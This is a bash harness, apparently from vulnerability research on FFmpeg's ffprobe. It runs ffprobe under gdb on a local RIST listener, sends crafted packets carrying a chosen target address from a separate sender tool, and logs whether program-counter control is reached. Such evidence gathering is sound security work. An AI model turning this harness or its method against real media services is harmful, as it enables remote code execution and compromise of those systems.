#!/usr/bin/env bash
# W4: wire-chosen prot target and natural dispatch. Args: NAME BINARY TARGET [LEN]
set -u
ROOT=$(cd "$(dirname "$0")" && pwd)
LIB="$ROOT/prefix/lib"
name=${1:-pc-file}; bin=${2:-$ROOT/plain/src/ffprobe_g}
target=${3:-0x55555584f5a0}; len=${4:-9968}
mkdir -p "$ROOT/evidence"
OUT="$ROOT/evidence/${name}.log"; SEND="$ROOT/evidence/${name}-send.log"
(env LD_LIBRARY_PATH="$LIB" MALLOC_MMAP_THRESHOLD_=16777216 \
    timeout 45 gdb -q -batch -x "$ROOT/ptr-control.cmd" \
    --args "$bin" -hide_banner -loglevel verbose -f data \
    -i async:rist://@:5004 -show_packets > "$OUT" 2>&1; \
    echo "gdb rc=$?" >> "$OUT") &
gdb_pid=$!
sleep 3
(env LD_LIBRARY_PATH="$LIB" timeout 30 "$ROOT/rist_sender_ptr" \
    'rist://127.0.0.1:5004' 2200 "$len" "$target" > "$SEND" 2>&1; \
    echo "sender rc=$?" >> "$SEND") &
sender_pid=$!
wait $sender_pid $gdb_pid
printf '%-16s %s | %s\n' "$name" \
    "$(grep -c 'PC FIRST HIT' "$OUT") watch hits" \
    "$(grep -E 'PC FIRST HIT|PC NEXT STOP|PC prot=|Breakpoint 3, file_read' "$OUT" | tr '\n' ' ')"
